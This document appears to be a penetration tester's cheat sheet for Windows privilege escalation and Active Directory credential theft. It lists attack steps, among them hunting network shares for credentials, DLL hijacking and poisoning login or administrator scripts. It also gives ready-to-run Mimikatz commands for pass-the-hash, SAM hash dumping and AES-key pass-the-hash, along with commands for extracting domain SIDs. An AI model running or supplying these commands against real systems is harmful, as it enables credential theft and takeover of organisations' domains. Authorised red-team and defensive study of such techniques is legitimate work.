-- Windows Privilege Escalation Checklist --

·Enumerate all File Servers in a domain and net view to find open shares. Once all shares are located, enumerate all share files/folders for sensitive data such as: administrative info, credentials, user home directories, etc. Repeat against other systems in the domain (other server roles like database, web, etc.) which may have misconfigured network shares exposing sensitive data.
·Enumerate PATH and then .DLL hijack (wlbsctrl or scheduler) if applicable.
·Run open-source tool "SharpUp" to enumerate potential privilege escalation opportunities such as vulnerable paths, weak service information, and more.
·Enumerate startup folder, user scheduled tasks, etc. Attempt to poison global shared scripts set to run at login.
·Gain access to administrative shares and attempt to poison scripts run by administrators or macro enabled files.

-- Mimikatz Credential Manipulation --

# Mimikatz PTH (Runs specified binary with PTH credentials). Must be run as SYSTEM
mimikatz.exe "sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:<FILE_PATH>" exit

# Mimikatz hashdump. Must be run as SYSTEM
mimikatz.exe "lsadump::sam" exit

# PTH with AES128/256 bit keys. AES128/256 bit keys can be obtained via DCSync
mimikatz.exe sekurlsa::pth /user:<USERNAME> /domain: <DOMAIN> /ntlm:<NTLM_HASH> /aes128:<aes128_HASH>/aes256:<aes256_HASH>

# Extract domain SID from Active Directory object
wmic group where name="Domain Admins" get name,sid,domain
or
reg query HKU to retrieve logged in domain user SIDs (which contain domain SID)

Result of above commands:
S-1-5-21-520640528-869697576-4233872597-1532

The Domain SID Portion is:S-1-5-21-520640528-869697576-4233872597
